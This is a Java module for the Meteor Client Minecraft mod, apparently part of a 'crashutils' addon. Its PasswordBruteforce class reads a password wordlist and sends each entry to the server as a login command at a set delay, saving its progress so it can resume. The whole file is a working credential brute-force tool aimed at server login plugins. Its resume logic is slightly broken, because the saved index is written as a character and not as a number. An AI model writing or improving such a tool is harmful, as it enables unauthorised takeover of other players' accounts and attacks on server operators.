package ru.kredwi.crashutils.modules;

import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.Minecraft;
import org.apache.commons.lang3.tuple.Pair;
import org.jetbrains.annotations.Nullable;
import ru.kredwi.crashutils.CrashUtils;

import java.io.*;
import java.text.MessageFormat;
import java.util.concurrent.CompletableFuture;

public class PasswordBruteforce extends Module {

    public static final String SAVEABLE_FILE = "last_password.txt";

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<String> messages = sgGeneral.add(new StringSetting.Builder()
        .name("path_to_passwordes.txt")
        .description("Messages to use for spam.")
        .defaultValue("passworws.txt")
        .build()
    );

    private final Setting<String> command = sgGeneral.add(new StringSetting.Builder()
        .name("command")
        .description("command to login")
        .defaultValue("login {0}")
        .build()
    );

    private final Setting<Integer> delay = sgGeneral.add(new IntSetting.Builder()
        .name("delay")
        .description("Delay of command in ms")
        .defaultValue(1000)
        .min(0)
        .max(10000)
        .sliderMax(1000)
        .sliderMin(0)
        .build()
    );

    private final Setting<Boolean> saveLast = sgGeneral.add(new BoolSetting.Builder()
        .name("saveLast")
        .description("Save latest using password")
        .defaultValue(true)
        .build()
    );

    private Pair<String, Integer> last = getSavedState();

    public PasswordBruteforce() {
        super(CrashUtils.CRASH_UTILS_CATEGORY, "PasswordBruteforce", "Bruteforce passwordes");
    }

    @Override
    public void onActivate() {
        var connection = Minecraft.getInstance().getConnection();
        if (connection == null) {
            toggle();
            return;
        }

        if (command.get().isEmpty()) {
            error("Command cannot be empty");
            toggle();
            return;
        }

        CompletableFuture.runAsync(() -> {
            File file = new File(messages.get());
            if (!file.exists()) {
                error("File with path " + messages.get() + " is not exists");
                return;
            }
            if (!file.canRead()) {
                error("No access to read file");
                return;
            }
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)))) {
                String line;
                int i = 0;
                while ((line = reader.readLine()) != null) {
                    if (!isActive())
                        return;
                    i++;
                    if (last != null && last.getRight() > i) {
                        continue;
                    }
                    String finalLine = line;
                    int finalI = i;
                    Minecraft.getInstance().execute(() -> {
                        var connection1 = Minecraft.getInstance().getConnection();
                        if (connection1 != null) {
                            if (saveLast.get())
                                last = Pair.of(finalLine, finalI);
                            info("Password used: " + finalLine);
                            connection1.sendCommand(MessageFormat.format(command.get(), finalLine));
                        }
                    });

                    Thread.sleep(delay.get());
                }
                toggle();
                info("All passwords is checked");
            } catch (FileNotFoundException e) {
                error("File not found " + e.getMessage());
            } catch (IOException e) {
                error("Error of writing file " + e.getMessage());
            } catch (InterruptedException e) {
                error("Error of thread Interrupted " + e.getMessage());
            }
        });
    }

    @EventHandler
    private void onPlayerDisconnect(GameLeftEvent e) {
        shutdown();
        toggle();
    }

    @Nullable
    private Pair<String, Integer> getSavedState() {
        if (!saveLast.get()) {
            return null; // saved state is disabled
        }
        File file = new File(SAVEABLE_FILE);
        if (!file.exists())
            return null; // state is not saved

        try (BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(file)))) {
            String left = br.readLine();
            int right = Integer.parseInt(br.readLine());

            file.delete(); // not required

            return Pair.of(left, right);
        } catch (FileNotFoundException e) {
            CrashUtils.LOG.error("Error of write saveable file. Not found ", e);
        } catch (IOException e) {
            CrashUtils.LOG.error("Error of write saveable file.", e);
        } catch (NumberFormatException e) {
            CrashUtils.LOG.error("Error of parse number value. Invalid saved data", e);
            CrashUtils.LOG.info("Delete saveable file");
            boolean result = file.delete();
            if (!result)
                CrashUtils.LOG.warn("Saveable file is not deleted");
        }
        return null;
    }

    private void shutdown() {
        if (!saveLast.get()) {
            return; // saved state is disabled
        }
        if (last != null) {
            File file = new File(SAVEABLE_FILE);
            try (BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file)))) {
                bw.write(last.getLeft());
                bw.newLine();
                bw.write(last.getRight());
                bw.newLine();
            } catch (FileNotFoundException e) {
                MeteorClient.LOG.error("File not found with save file ", e);
            } catch (IOException e) {
                MeteorClient.LOG.error("Error of save file ", e);
            }

        }
    }
}
